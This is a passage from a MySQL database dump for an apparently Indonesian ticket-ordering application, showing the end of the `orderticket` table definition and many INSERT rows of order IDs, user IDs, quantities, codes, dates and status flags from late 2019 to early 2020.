  `status_orderticket` tinyint(1) NOT NULL,
  `used_orderticket` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `orderticket`
--

INSERT INTO `orderticket` (`id_orderticket`, `id_users`, `id_ticket`, `jumlah_orderticket`, `kode_orderticket`, `die_orderticket`, `tgl_orderticket`, `status_orderticket`, `used_orderticket`, `created_at`, `updated_at`) VALUES
('05e2UIQokO1v71FHNc6uUvBKGl', 167, 2, 2, 19, '2019-11-29 10:21:49', '2019-11-29', 3, 0, '2019-11-29 09:21:49', '2019-11-29 09:21:49'),
('06stVBAtdPR35EcTs94sgMkdrz', 74, 2, 3, 178, '2019-11-29 03:53:11', '2019-11-29', 2, 0, '2019-11-29 02:53:11', '2019-12-08 15:37:21'),
('07UHSiBY7Voz0QWqPN9HUsClww', 125, 2, 1, 536, '2019-11-29 06:26:00', '2019-11-29', 3, 0, '2019-11-29 05:26:00', '2019-11-29 05:26:00'),
('0eQKEgya5TDVMUmNOcwL3YYRBD', 59, 2, 1, 911, '2019-11-29 04:30:08', '2019-11-29', 3, 0, '2019-11-29 03:30:08', '2019-11-29 03:30:08'),
('0oKSeTOy2Ecm6ZY3i8cwmyraxU', 111, 2, 1, 380, '2019-11-29 05:27:50', '2019-11-29', 2, 0, '2019-11-29 04:27:50', '2019-12-11 16:06:04'),
('0RZXEcQeGVGGMZ1BmNwpCeNoxU', 257, 3, 1, 961, '2020-01-06 17:26:03', '2020-01-06', 3, 0, '2020-01-06 16:26:03', '2020-01-06 16:26:03'),
('0Z558Xw39NJySHj9jslW1zvfWK', 217, 2, 1, 642, '2019-11-29 18:48:07', '2019-11-29', 1, 0, '2019-11-29 17:48:07', '2019-11-29 18:16:00'),
('1SOVpK1rSP1pc878GW5BTM9upo', 275, 3, 2, 370, '2020-01-10 09:08:18', '2020-01-10', 1, 1, '2020-01-10 08:08:18', '2020-01-15 11:28:20'),
('1x7GP84aeG5wFQuLRdecYWjggv', 192, 2, 1, 74, '2019-12-01 11:08:05', '2019-12-01', 3, 0, '2019-12-01 10:08:05', '2019-12-01 10:08:05'),
('2cRDrZx0lgEHq3MKEorMnp6lXZ', 109, 2, 1, 965, '2019-11-29 09:11:22', '2019-11-29', 3, 0, '2019-11-29 08:11:22', '2019-11-29 08:11:22'),
('2G9tQBbNneq9aI3FIde13w6ePs', 205, 2, 3, 664, '2019-11-29 16:01:04', '2019-11-29', 1, 0, '2019-11-29 15:01:04', '2019-11-29 15:51:36'),
('2m3PKnghzLXPEzFN62e2r1Z1Iw', 104, 2, 2, 258, '2019-11-29 05:09:17', '2019-11-29', 3, 0, '2019-11-29 04:09:17', '2019-11-29 04:09:17'),
('2v4jV17CsYAkhoQ8MeaLF8IKUw', 39, 1, 1, 435, '2019-11-26 14:32:17', '2019-11-26', 2, 0, '2019-11-26 13:32:17', '2020-01-15 08:21:59'),
('374ZnK50Lwln063GscjHFS1jxT', 108, 2, 1, 558, '2019-11-29 15:15:36', '2019-11-29', 3, 0, '2019-11-29 14:15:36', '2019-11-29 14:15:36'),
('3qiDql1xbdp2WFdc37wuQWJ6QW', 174, 2, 1, 913, '2019-11-29 11:30:09', '2019-11-29', 1, 0, '2019-11-29 10:30:09', '2019-11-29 10:30:09'),
('3wvLrtKFvmXCuztWXvm2PV6PGA', 177, 2, 1, 762, '2019-11-29 11:49:49', '2019-11-29', 3, 0, '2019-11-29 10:49:49', '2019-11-29 10:49:49'),
('4bF2sZDrJvKyesGgeEfzJGUDdz', 117, 2, 1, 471, '2019-11-29 07:09:15', '2019-11-29', 3, 0, '2019-11-29 06:09:15', '2019-11-29 06:09:15'),
('4lR6gTH4lUqFVuOrBF009mUJqC', 41, 2, 1, 895, '2019-11-29 03:59:35', '2019-11-29', 2, 0, '2019-11-29 02:59:35', '2019-12-10 16:37:48'),
('4M2caWOdvFFYK3onCMZUkOcnpc', 91, 2, 2, 723, '2019-11-29 04:38:06', '2019-11-29', 3, 0, '2019-11-29 03:38:06', '2019-11-29 03:38:06'),
('4YlwCxnHJtT9eGzI3XpKlsgqWj', 119, 2, 1, 88, '2019-11-29 05:55:37', '2019-11-29', 3, 0, '2019-11-29 04:55:37', '2019-11-29 04:55:37'),
('5Din7shr2I0rQyh2UcgZp7qdzX', 276, 3, 2, 669, '2020-01-11 05:49:17', '2020-01-11', 3, 0, '2020-01-11 04:49:17', '2020-01-11 04:49:17'),
('5fp9OJ9U6sMeCwAy7dysmXMii2', 272, 3, 3, 938, '2020-01-12 15:14:53', '2020-01-12', 1, 1, '2020-01-12 14:14:53', '2020-01-19 06:41:57'),
('5fZl5bNfQg3dSsyjBSUAUpj3gh', 168, 2, 3, 78, '2019-11-29 10:31:38', '2019-11-29', 3, 0, '2019-11-29 09:31:38', '2019-11-29 09:31:38'),
('66Cn9fnb0TTv4bcP0WM14yWwPZ', 138, 2, 1, 303, '2019-11-29 07:11:30', '2019-11-29', 3, 0, '2019-11-29 06:11:30', '2019-11-29 06:11:30'),
('6BYiL7FF6ICwqKqad9Ox3S8aVW', 192, 2, 1, 512, '2019-11-29 13:48:27', '2019-11-29', 3, 0, '2019-11-29 12:48:27', '2019-11-29 12:48:27'),
('6csvVzhR1RtnduPveeOpWTKr8y', 214, 2, 2, 832, '2019-11-29 17:45:04', '2019-11-29', 1, 1, '2019-11-29 16:45:04', '2020-01-18 11:15:12'),
('6j1l7DCWYqqMBgmVSA7iLohutM', 220, 2, 1, 414, '2019-11-30 05:54:36', '2019-11-30', 1, 0, '2019-11-30 04:54:36', '2019-11-30 10:26:35'),
('6nOJfU9JJyw0oXbl4p0Bw9aw8t', 48, 2, 1, 589, '2019-12-01 04:01:32', '2019-12-01', 1, 0, '2019-12-01 03:01:32', '2019-12-01 03:46:21'),
('6XOAVCFEzpL1NzETUWDsNexZun', 145, 2, 1, 384, '2019-11-29 07:49:14', '2019-11-29', 3, 0, '2019-11-29 06:49:14', '2019-11-29 06:49:14'),
('7ImwWf9VR7Q0v29Cx7duMYQiCO', 64, 2, 2, 866, '2019-11-29 04:42:28', '2019-11-29', 3, 0, '2019-11-29 03:42:28', '2019-11-29 03:42:28'),
('7VQXSX5G4LfvtpqI4OgbCs1KVK', 197, 2, 2, 931, '2019-11-29 14:08:25', '2019-11-29', 3, 0, '2019-11-29 13:08:25', '2019-11-29 13:08:25'),
('83zTtCjZ2otgl388txyb8dGpyg', 282, 3, 2, 479, '2020-01-16 09:51:07', '2020-01-16', 1, 1, '2020-01-16 08:51:07', '2020-01-18 19:31:28'),
('8AE0V3n7Q67gvMOkJ44YXFZflq', 80, 2, 3, 438, '2019-11-29 04:20:23', '2019-11-29', 3, 0, '2019-11-29 03:20:23', '2019-11-29 03:20:23'),
('8cIwihF0Uvor7ems3lTwFEFfgY', 133, 2, 1, 26, '2019-11-29 06:56:12', '2019-11-29', 3, 0, '2019-11-29 05:56:12', '2019-11-29 05:56:12'),
('8SKBHkkch4IHTvHq53yK4K5Y1v', 36, 2, 1, 928, '2019-11-29 05:04:09', '2019-11-29', 3, 0, '2019-11-29 04:04:09', '2019-11-29 04:04:09'),
('8VQi0AoO0uweU7GGy5cBi1abRQ', 203, 2, 3, 707, '2019-11-29 15:47:44', '2019-11-29', 1, 0, '2019-11-29 14:47:44', '2019-11-29 15:09:55'),
('95XcNsnJgvH7wz94E70oJ7ol9P', 177, 2, 1, 887, '2019-12-02 01:49:53', '2019-12-02', 3, 0, '2019-12-02 00:49:53', '2019-12-02 00:49:53'),
('9A9VncfUGO2o3tAs6ILu06JFu3', 108, 2, 1, 736, '2019-11-29 05:12:26', '2019-11-29', 2, 0, '2019-11-29 04:12:26', '2019-12-08 15:37:41'),
('9CFtmtEfRpI64jnwJE9wKHNrmX', 154, 2, 2, 562, '2019-11-29 08:15:53', '2019-11-29', 2, 0, '2019-11-29 07:15:53', '2019-12-14 13:56:07'),
('9Fz7qAIAqjpq2g4lnwkEUget4K', 127, 2, 1, 732, '2019-11-29 06:37:05', '2019-11-29', 3, 0, '2019-11-29 05:37:05', '2019-11-29 05:37:05'),
('9gbXI7Ng3OEqq8AL9E0ha9G2xG', 140, 2, 1, 206, '2019-11-29 08:21:49', '2019-11-29', 3, 0, '2019-11-29 07:21:49', '2019-11-29 07:21:49'),
('9YCKqWacqrakO9ctpAK7llLKdu', 234, 2, 3, 451, '2019-12-02 09:44:54', '2019-12-02', 3, 0, '2019-12-02 08:44:54', '2019-12-02 08:44:54'),
('A4h0MV313vFCDwTJ5wnV5LKL1g', 267, 3, 1, 124, '2020-01-12 08:13:18', '2020-01-12', 1, 1, '2020-01-12 07:13:18', '2020-01-19 06:02:49'),
('A6TkiBsrEmETy1iLUkUFIwxxLW', 120, 2, 1, 270, '2019-11-29 13:27:33', '2019-11-29', 3, 0, '2019-11-29 12:27:33', '2019-11-29 12:27:33'),
('aAankJ26xuVXyBGOCXSLmfApGg', 104, 2, 1, 461, '2019-11-29 05:05:21', '2019-11-29', 3, 0, '2019-11-29 04:05:21', '2019-11-29 04:05:21'),
('aDUIl3LuCfnxUFo1YdqtDvuR1C', 232, 2, 1, 42, '2019-12-01 09:32:14', '2019-12-01', 2, 0, '2019-12-01 08:32:14', '2019-12-08 13:55:57'),
('agJ2GQT5Cg5PQeEfiDtHq4fy1Y', 132, 2, 1, 798, '2019-11-29 08:01:43', '2019-11-29', 2, 0, '2019-11-29 07:01:43', '2019-12-08 14:20:51'),
('aIT7QBz9gpz3QSWbZV6mHLyrID', 181, 3, 1, 494, '2020-01-07 16:45:04', '2020-01-07', 3, 0, '2020-01-07 15:45:04', '2020-01-07 15:45:04'),
('aJcJCkElbtnfL2glGFEmIVD3z5', 53, 2, 1, 256, '2019-11-29 16:25:01', '2019-11-29', 3, 0, '2019-11-29 15:25:01', '2019-11-29 15:25:01'),
('aKPxZhNgmuIkHqLeYE9egv8VNM', 227, 2, 1, 390, '2019-11-30 19:48:49', '2019-12-01', 2, 0, '2019-11-30 18:48:49', '2019-12-15 16:39:00'),
('AQSY7lg2O5wJntWzU21NOFoyVl', 141, 2, 1, 302, '2019-11-29 08:23:18', '2019-11-29', 3, 0, '2019-11-29 07:23:18', '2019-11-29 07:23:18'),
('Ar3spvFAklS8UbCmo14GBEr8XG', 185, 2, 1, 438, '2019-11-29 12:24:13', '2019-11-29', 3, 0, '2019-11-29 11:24:13', '2019-11-29 11:24:13'),
('asdglHXAs3FpMytOhD0RHcsrC2', 141, 2, 1, 488, '2019-11-29 08:19:29', '2019-11-29', 3, 0, '2019-11-29 07:19:29', '2019-11-29 07:19:29'),
('aSHajBjob8ODLcSQAmT2PcTL4c', 285, 3, 1, 689, '2020-01-17 17:35:58', '2020-01-17', 1, 1, '2020-01-17 16:35:58', '2020-01-19 06:45:58'),
('awQssUpZu9YCxj61ronFsC1QTX', 73, 2, 1, 411, '2019-11-29 04:38:20', '2019-11-29', 3, 0, '2019-11-29 03:38:20', '2019-11-29 03:38:20'),
('bbF8y0SWwRrTpFHDwZmKKl0lV8', 82, 2, 1, 483, '2019-11-29 04:32:43', '2019-11-29', 3, 0, '2019-11-29 03:32:43', '2019-11-29 03:32:43'),
('BGzT92nNS6vsNFqcm9KRFfTfb6', 285, 3, 1, 854, '2020-01-17 12:02:10', '2020-01-17', 3, 0, '2020-01-17 11:02:10', '2020-01-17 11:02:10'),
('bKmmydAXYhoNubWHO96mdUX26Z', 269, 3, 2, 519, '2020-01-08 07:22:12', '2020-01-08', 1, 1, '2020-01-08 06:22:12', '2020-01-19 06:03:24'),
('BKyGDfsNh4pka5qq3oPWZqw3XQ', 159, 2, 3, 804, '2019-11-29 09:01:13', '2019-11-29', 3, 0, '2019-11-29 08:01:13', '2019-11-29 08:01:13'),
('BooK4R59vncWYPeGn54ZpgpfAM', 126, 2, 3, 603, '2019-11-30 09:48:01', '2019-11-30', 3, 0, '2019-11-30 08:48:01', '2019-11-30 08:48:01'),
('ByNNSOPIWFfBG8Wu0LtKlod2xJ', 68, 2, 1, 283, '2019-11-29 15:36:02', '2019-11-29', 3, 0, '2019-11-29 14:36:02', '2019-11-29 14:36:02'),
('c1mNqPnYYsCuoIYVhjGALWU1pI', 42, 2, 2, 918, '2019-11-29 15:03:41', '2019-11-29', 3, 0, '2019-11-29 14:03:41', '2019-11-29 14:03:41'),
('C5UaR1VoyFgKHXHuMj0vMuwM0W', 89, 2, 2, 478, '2019-11-29 04:34:56', '2019-11-29', 2, 0, '2019-11-29 03:34:56', '2019-11-29 17:35:55'),
('CCVCJtfU27Vlpkjst2RXgJUXNG', 256, 3, 1, 597, '2020-01-07 04:30:43', '2020-01-07', 1, 1, '2020-01-07 03:30:43', '2020-01-15 07:24:14'),
('cD8erz1T2rKq2wJp6yYA65XNCj', 285, 3, 1, 836, '2020-01-17 15:15:15', '2020-01-17', 3, 0, '2020-01-17 14:15:15', '2020-01-17 14:15:15'),
('cFZew3ITmPZwTV2RGoZFATKVdy', 226, 2, 1, 870, '2019-11-30 18:30:49', '2019-11-30', 2, 0, '2019-11-30 17:30:49', '2019-12-15 15:03:08'),
('cQSC6kGHWEbd1tMgn9DEgdzNFw', 207, 2, 3, 924, '2019-11-29 16:23:27', '2019-11-29', 3, 0, '2019-11-29 15:23:27', '2019-11-29 15:23:27'),
('CsBj5qJStX3ewRO7JSSuCFmcaq', 279, 3, 1, 742, '2020-01-15 06:41:50', '2020-01-15', 3, 0, '2020-01-15 05:41:50', '2020-01-15 05:41:50'),
('CXS7BNIRDX1r0vuQRHkuhMMnCd', 82, 2, 2, 327, '2019-11-29 04:24:05', '2019-11-29', 2, 0, '2019-11-29 03:24:05', '2019-11-29 03:30:24'),
('Cy6D6dDFzWcNAVbVf5SVBFiOpW', 274, 3, 1, 624, '2020-01-09 16:00:48', '2020-01-09', 3, 0, '2020-01-09 15:00:48', '2020-01-09 15:00:48'),
('cZhF3YryeesVNfzAJpB0Bd1jzZ', 291, 3, 3, 246, '2020-01-18 20:31:07', '2020-01-19', 1, 1, '2020-01-18 19:31:07', '2020-01-19 07:00:50'),
('dAmR8lBJ4sW4YrkVrFOIPXkxck', 93, 2, 1, 313, '2019-11-29 04:45:01', '2019-11-29', 2, 0, '2019-11-29 03:45:01', '2019-12-11 16:04:30'),
('Dd67VxogyC10COXalUObbvHHkv', 175, 2, 1, 852, '2019-11-29 11:31:09', '2019-11-29', 3, 0, '2019-11-29 10:31:09', '2019-11-29 10:31:09'),
('Djcx9GdGYmevM5JjQ1AGMjqCW2', 256, 3, 1, 192, '2020-01-06 15:29:45', '2020-01-06', 3, 0, '2020-01-06 14:29:45', '2020-01-06 14:29:45'),
('DlDwCRJYeVmLy9HQYWe3mHXstw', 282, 3, 1, 35, '2020-01-16 09:53:45', '2020-01-16', 1, 0, '2020-01-16 08:53:45', '2020-01-16 08:57:34'),
('dOU57f0Aax72XPzxHfh5RhkwFp', 257, 3, 1, 949, '2020-01-07 08:40:11', '2020-01-07', 3, 0, '2020-01-07 07:40:11', '2020-01-07 07:40:11'),
('E0eHSjzbKhLEcDzlZGMHNL92wf', 143, 2, 3, 458, '2019-11-29 07:31:51', '2019-11-29', 2, 0, '2019-11-29 06:31:51', '2019-12-16 14:35:06'),
('eaAkOrmWcxpxdsqozMhtUvWwqJ', 102, 2, 3, 125, '2019-11-29 05:01:35', '2019-11-29', 3, 0, '2019-11-29 04:01:35', '2019-11-29 04:01:35'),
('Eakk4FOxR8DryYZIMmeFrXzCwj', 208, 2, 1, 447, '2019-11-29 16:31:10', '2019-11-29', 3, 0, '2019-11-29 15:31:10', '2019-11-29 15:31:10'),
('eCp6xCkhhWA1d1E0jgjbE1PmOl', 197, 2, 1, 791, '2019-11-29 14:07:16', '2019-11-29', 3, 0, '2019-11-29 13:07:16', '2019-11-29 13:07:16'),
('Eg0bWipxjgBmpm2dzVpMQbOAmB', 237, 2, 3, 181, '2020-01-16 08:59:33', '2020-01-16', 1, 1, '2020-01-16 07:59:33', '2020-01-16 08:16:54'),
('EGjaSIlmMR2d6P4D2zpmuGGdSS', 216, 2, 3, 459, '2019-11-29 18:46:39', '2019-11-29', 2, 0, '2019-11-29 17:46:39', '2019-12-14 13:18:22'),
('eJVBP7Y2VT5kjBRYBLFgSZMQAT', 231, 2, 2, 327, '2019-12-01 09:07:05', '2019-12-01', 2, 0, '2019-12-01 08:07:05', '2019-12-14 13:18:06'),
('elV0J3aKV6rytZ3HhAu97gc2DQ', 40, 1, 1, 244, '2019-11-27 03:14:29', '2019-11-26', 3, 0, '2019-11-26 03:14:29', '2019-11-26 03:14:29'),
('enqTe0f8Nv5unPIgFRAE1Y9OWP', 142, 2, 1, 949, '2019-11-29 07:30:47', '2019-11-29', 1, 1, '2019-11-29 06:30:47', '2020-01-19 06:42:38'),
('EQ19Ih1Wp1CjKm91WArpknNtp7', 66, 2, 2, 867, '2019-11-29 03:31:08', '2019-11-29', 2, 0, '2019-11-29 02:31:08', '2019-12-08 14:06:28'),
('Etold2qPjWfPTjdmwc67oEgkdQ', 261, 3, 2, 422, '2020-01-07 02:02:44', '2020-01-07', 3, 0, '2020-01-07 01:02:44', '2020-01-07 01:02:44'),
('ETsb6WxFNk8JIpYjzgaGmjlrjG', 121, 2, 1, 128, '2019-11-29 06:55:06', '2019-11-29', 3, 0, '2019-11-29 05:55:06', '2019-11-29 05:55:06'),
('ExHEJ4wV27ow1NrXStTfLxfST7', 49, 2, 3, 41, '2019-11-29 06:51:47', '2019-11-29', 3, 0, '2019-11-29 05:51:47', '2019-11-29 05:51:47'),
('eZsvjxJFNijv6laHnbFDqq9z9u', 130, 2, 1, 993, '2019-11-29 06:41:30', '2019-11-29', 3, 0, '2019-11-29 05:41:30', '2019-11-29 05:41:30'),
('F6b92L3HWYVM99MuhP25TvnGcJ', 238, 2, 3, 200, '2019-12-02 16:18:24', '2019-12-02', 2, 0, '2019-12-02 15:18:24', '2019-12-08 13:53:51'),
('FcOuwPa7BWT9cRCe7bV2AbB7T4', 100, 2, 3, 292, '2019-11-29 04:59:57', '2019-11-29', 3, 0, '2019-11-29 03:59:57', '2019-11-29 03:59:57'),
('frLsXpkcN6C6SkM9nQLFSR8miZ', 112, 2, 1, 15, '2019-11-29 05:30:26', '2019-11-29', 3, 0, '2019-11-29 04:30:26', '2019-11-29 04:30:26'),
('FZSfjcIF0HkJJuNqs6zuAzMOJ4', 254, 3, 2, 637, '2020-01-04 19:16:22', '2020-01-05', 3, 0, '2020-01-04 18:16:22', '2020-01-04 18:16:22'),
('g8tFlz7u4VBqhJbIV5oAcojj7s', 182, 2, 1, 346, '2019-11-29 12:03:29', '2019-11-29', 3, 0, '2019-11-29 11:03:29', '2019-11-29 11:03:29'),
('GcLVx5NPj8W8hD9rTCsWkcA1xF', 191, 2, 3, 566, '2019-11-29 13:19:49', '2019-11-29', 2, 0, '2019-11-29 12:19:49', '2019-12-15 14:53:26'),
('GEtkRckvV3WkhdFl8tVW1DR1gh', 38, 1, 2, 337, '2019-11-27 03:02:01', '2019-11-26', 2, 0, '2019-11-26 03:02:01', '2019-12-15 16:34:39'),
('GJDnXciAmPY8U8TVsfZ8vRXTCv', 86, 2, 1, 250, '2019-11-29 04:31:53', '2019-11-29', 3, 0, '2019-11-29 03:31:53', '2019-11-29 03:31:53'),
('GjEPplNmsESUqlOfpUheZq0QnK', 228, 3, 2, 260, '2020-01-07 12:15:33', '2020-01-07', 3, 0, '2020-01-07 11:15:33', '2020-01-07 11:15:33'),
('GRh92ElCc0HDu6ACeh4UW8lq4W', 66, 2, 1, 281, '2019-11-29 05:04:05', '2019-11-29', 2, 0, '2019-11-29 04:04:05', '2019-12-08 14:06:21'),
('gufEPUXRNpJhdjFJAgmKzlqkCT', 270, 3, 1, 290, '2020-01-08 05:41:36', '2020-01-08', 1, 1, '2020-01-08 04:41:36', '2020-01-15 08:48:51'),
('hA8sxLIKirr3z6X5p7TJvtsriZ', 96, 2, 1, 748, '2019-11-29 04:49:08', '2019-11-29', 2, 0, '2019-11-29 03:49:08', '2019-12-11 16:21:45'),
('HENNLjiiFZAw67zuIjdtsOjmIX', 267, 3, 1, 5, '2020-01-14 18:08:50', '2020-01-14', 1, 0, '2020-01-14 17:08:50', '2020-01-15 06:55:19'),
('Hm2FvdlWvMa9hCw5DchAIwnnWr', 35, 1, 1, 221, '2019-11-27 02:49:33', '2019-11-26', 2, 0, '2019-11-26 02:49:33', '2019-12-15 14:56:54'),
('hOahDY9Yk4hAR6eVJx6AcTgY3v', 178, 2, 3, 997, '2019-11-29 11:51:05', '2019-11-29', 2, 0, '2019-11-29 10:51:05', '2019-12-10 16:32:08'),
('hoFkCtBbIwqQKiJu8i9ZilddQB', 164, 2, 1, 973, '2019-12-02 08:42:06', '2019-12-02', 3, 0, '2019-12-02 07:42:06', '2019-12-02 07:42:06'),
('hSaW6kTZLBJG1QypznY5mF07wh', 213, 2, 1, 919, '2019-11-29 17:39:34', '2019-11-29', 3, 0, '2019-11-29 16:39:34', '2019-11-29 16:39:34'),
('hvU2oOh8eYp0tBrlS5wIn5hGMl', 277, 3, 3, 63, '2020-01-14 05:54:22', '2020-01-14', 1, 1, '2020-01-14 04:54:22', '2020-01-15 07:20:03'),
('hYxJTFLobanmVYrNnbXh90KGGl', 221, 2, 3, 582, '2019-11-30 07:48:52', '2019-11-30', 3, 0, '2019-11-30 06:48:52', '2019-11-30 06:48:52'),
('icpE1Ssb3GAYtfdULl7LX2VVhX', 120, 2, 1, 382, '2019-11-29 05:55:02', '2019-11-29', 3, 0, '2019-11-29 04:55:02', '2019-11-29 04:55:02'),
('IpSSME8s5CTXl5RK2mUhspTKjO', 185, 2, 2, 479, '2019-11-29 12:30:48', '2019-11-29', 3, 0, '2019-11-29 11:30:48', '2019-11-29 11:30:48'),
('Ixr5AdvIixQWIv6BVuVS0SRxia', 124, 2, 3, 728, '2019-11-29 06:24:42', '2019-11-29', 3, 0, '2019-11-29 05:24:42', '2019-11-29 05:24:42'),
('J29LONlO5l9jARdBYsNphEFlUX', 76, 2, 3, 193, '2019-11-29 04:06:00', '2019-11-29', 3, 0, '2019-11-29 03:06:00', '2019-11-29 03:06:00'),
('jCR3RPxZs5gM8i0PaONCQGJMno', 264, 3, 2, 510, '2020-01-07 14:53:49', '2020-01-07', 1, 1, '2020-01-07 13:53:49', '2020-01-15 08:44:48'),
('JfGwoI7WpChKMvgeiu1q2SMND4', 172, 2, 3, 525, '2019-11-29 11:02:26', '2019-11-29', 3, 0, '2019-11-29 10:02:26', '2019-11-29 10:02:26'),
('jisDcKHsDFd2Mj1VoQhDIxmhsS', 151, 2, 3, 611, '2019-11-29 11:49:50', '2019-11-29', 1, 1, '2019-11-29 10:49:50', '2020-01-15 03:50:42'),
('jP6uxUH34lUqXG0euOgbTxcip5', 210, 2, 1, 34, '2019-11-29 16:41:40', '2019-11-29', 3, 0, '2019-11-29 15:41:40', '2019-11-29 15:41:40'),
('jpH6z3PLnDn0fw5OvWPHjWft0B', 189, 2, 3, 855, '2019-11-29 13:16:04', '2019-11-29', 3, 0, '2019-11-29 12:16:04', '2019-11-29 12:16:04'),
('jvKZ6ylxo9RPe2TvaEMyvQKtK6', 71, 2, 3, 973, '2019-11-29 03:44:34', '2019-11-29', 3, 0, '2019-11-29 02:44:34', '2019-11-29 02:44:34'),
('JXatOX2cADfV8kJHgbIwcb0DCc', 147, 2, 3, 259, '2019-11-29 07:55:16', '2019-11-29', 2, 0, '2019-11-29 06:55:16', '2019-12-15 15:06:54'),
('K5Xf2pFS84X3V9Ed4n4sM5I78H', 114, 2, 2, 471, '2019-11-29 05:45:56', '2019-11-29', 1, 0, '2019-11-29 04:45:56', '2019-11-29 11:30:09'),
('KBG7Y6uPMw8D36rmFH1mBLViP0', 135, 2, 1, 856, '2019-11-29 07:04:07', '2019-11-29', 3, 0, '2019-11-29 06:04:07', '2019-11-29 06:04:07'),
('kbochJw7Nzh5FWzwaDgO4MrQWy', 165, 2, 1, 327, '2019-11-29 10:09:00', '2019-11-29', 3, 0, '2019-11-29 09:09:00', '2019-11-29 09:09:00'),
('khgrkSu80EVMdi2sfLHyWQEjE8', 69, 2, 1, 260, '2019-11-29 03:45:11', '2019-11-29', 1, 1, '2019-11-29 02:45:11', '2020-01-16 10:27:54'),
('kHvDIrZrMF6hsjducWJC4MuQtn', 94, 2, 2, 532, '2019-11-29 04:45:51', '2019-11-29', 2, 0, '2019-11-29 03:45:51', '2019-11-29 08:55:13'),
('KLBv7jbtSSfAv7jcY0sgtAZsWd', 121, 2, 1, 462, '2019-11-29 06:21:59', '2019-11-29', 3, 0, '2019-11-29 05:21:59', '2019-11-29 05:21:59'),
('KyRO4sl76BFuMmkSds2fMEZXXB', 186, 2, 3, 965, '2019-11-29 12:31:27', '2019-11-29', 2, 0, '2019-11-29 11:31:27', '2019-12-15 14:49:35'),
('lCbbHdVWDXaLu9suCpVG4jLVkA', 181, 2, 1, 248, '2019-11-29 11:57:40', '2019-11-29', 3, 0, '2019-11-29 10:57:40', '2019-11-29 10:57:40'),
('LekOwdWYlTkiOXURkfzW3xkPdb', 163, 2, 1, 307, '2019-11-29 09:29:43', '2019-11-29', 3, 0, '2019-11-29 08:29:43', '2019-11-29 08:29:43'),
('Lgd9sFWtqSdYQbKPB6pWEpy93z', 195, 2, 3, 370, '2019-11-29 13:46:49', '2019-11-29', 3, 0, '2019-11-29 12:46:49', '2019-11-29 12:46:49'),
('lKoBZ4v7HGTdnvCw3iCLbMR76o', 43, 2, 3, 335, '2019-11-29 04:02:59', '2019-11-29', 3, 0, '2019-11-29 03:02:59', '2019-11-29 03:02:59'),
('LPqW7oyUeF74xen7hkYTaYcVD9', 181, 3, 1, 1, '2020-01-08 18:02:47', '2020-01-08', 1, 1, '2020-01-08 17:02:47', '2020-01-15 10:01:40'),
('ltNDJebGzYXJRGi1I3u886bR8M', 211, 2, 2, 144, '2019-11-29 17:07:01', '2019-11-29', 1, 0, '2019-11-29 16:07:01', '2019-11-29 16:19:20'),
('M23JiUckTI3DI0WCIL1p5x6GwZ', 78, 2, 3, 33, '2019-11-29 04:07:57', '2019-11-29', 3, 0, '2019-11-29 03:07:57', '2019-11-29 03:07:57'),
('M5E4uEcrL3pVlxd1Mn0i9tQ0Kl', 251, 3, 1, 772, '2020-01-08 11:39:27', '2020-01-08', 3, 0, '2020-01-08 10:39:27', '2020-01-08 10:39:27'),
('mCEn0Xj97DWWuKGGB7MnBquDiU', 228, 2, 1, 323, '2019-12-01 03:42:04', '2019-12-01', 3, 0, '2019-12-01 02:42:04', '2019-12-01 02:42:04'),
('MdqUdYvR3UFi94spf8m0lsUqUo', 160, 2, 1, 481, '2019-11-29 09:10:42', '2019-11-29', 3, 0, '2019-11-29 08:10:42', '2019-11-29 08:10:42'),
('mH0Dycx1tdwojs1waLWc2FlSIX', 110, 2, 3, 595, '2019-11-29 07:28:02', '2019-11-29', 3, 0, '2019-11-29 06:28:02', '2019-11-29 06:28:02'),
('mMAqRcUQV0OXK4UZxzyON03BlW', 232, 2, 1, 23, '2019-12-01 09:20:47', '2019-12-01', 3, 0, '2019-12-01 08:20:47', '2019-12-01 08:20:47'),
('mqhBW5jf9zWA8rEBBpQ0Diy61p', 175, 2, 1, 123, '2019-12-01 14:45:43', '2019-12-01', 3, 0, '2019-12-01 13:45:43', '2019-12-01 13:45:43'),
('N5Pa8yZR8s61pQTEIrlhMXV2Jm', 262, 3, 2, 833, '2020-01-08 17:09:23', '2020-01-07', 1, 1, '2020-01-07 07:09:20', '2020-01-15 09:56:38'),
('NcM2NiJT7hS2VxjgbCTXQeh6Dy', 262, 3, 1, 838, '2020-01-07 11:32:51', '2020-01-07', 3, 0, '2020-01-07 10:32:51', '2020-01-07 10:32:51'),
('NSm4ZyBzL9ooxgX04NUGL8FbS1', 215, 2, 1, 473, '2019-11-29 17:52:35', '2019-11-29', 3, 0, '2019-11-29 16:52:35', '2019-11-29 16:52:35'),
('nSQPQJPGvgVwY0GjzS8UkYHrdM', 90, 2, 2, 951, '2019-11-29 05:16:05', '2019-11-29', 3, 0, '2019-11-29 04:16:05', '2019-11-29 04:16:05'),
('NTKa25KsLUGlwzxAQ8V4lEjDIe', 196, 2, 3, 622, '2019-11-29 14:11:35', '2019-11-29', 3, 0, '2019-11-29 13:11:35', '2019-11-29 13:11:35'),
('OJIulAGUR1jCKqkK1YHwQ48o65', 36, 2, 1, 206, '2019-11-30 05:14:37', '2019-11-30', 2, 0, '2019-11-30 04:14:37', '2019-12-15 15:14:32'),
('oNgQGxuDprjAblatzSxcg5S0mr', 140, 2, 2, 836, '2019-11-29 07:18:13', '2019-11-29', 3, 0, '2019-11-29 06:18:13', '2019-11-29 06:18:13'),
('oR56eo35YkvjCO5YQQNjOfOUZ0', 95, 2, 1, 510, '2019-11-29 04:48:49', '2019-11-29', 3, 0, '2019-11-29 03:48:49', '2019-11-29 03:48:49'),
('OXApfPFmtBBfPotJgOumV4PYuQ', 290, 3, 1, 22, '2020-01-18 20:34:11', '2020-01-19', 1, 1, '2020-01-18 19:34:11', '2020-01-19 07:02:30'),
('oXFNgtwIxSUED2omxhDWzkv15P', 194, 2, 3, 711, '2019-11-29 15:08:56', '2019-11-29', 1, 0, '2019-11-29 14:08:56', '2019-11-29 14:18:39'),
('PBWRvU23Zc8OAMbTmlBouGPGCl', 173, 2, 1, 665, '2019-11-29 11:18:22', '2019-11-29', 3, 0, '2019-11-29 10:18:22', '2019-11-29 10:18:22'),
('pTZrA7Gdbv35YoJ4oHImJOlNty', 255, 3, 1, 480, '2020-01-06 12:56:04', '2020-01-06', 1, 0, '2020-01-06 11:56:04', '2020-01-06 16:28:37'),
